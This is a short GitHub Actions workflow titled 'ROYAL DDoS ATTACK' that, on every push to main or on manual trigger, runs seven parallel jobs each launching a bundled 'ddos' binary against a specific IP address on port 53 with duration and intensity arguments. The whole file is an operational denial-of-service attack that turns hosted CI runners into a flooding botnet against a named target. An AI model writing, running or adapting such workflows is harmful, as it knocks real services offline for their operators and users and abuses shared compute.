name: ROYAL DDoS ATTACK

on:
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  attack:
    name: Attack Job
    runs-on: ubuntu-22.04
    strategy:
      fail-fast: false
      matrix:
        job_id: [1, 2, 3, 4, 5, 6, 7]
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      
      - name: Make binary executable
        run: chmod +x ddos
      
      - name: Run Attack ${{ matrix.job_id }}
        run: |
          echo "Starting attack job ${{ matrix.job_id }}"
          ./ddos 147.75.202.61 53 300 64 5
          echo "Attack job ${{ matrix.job_id }} completed"
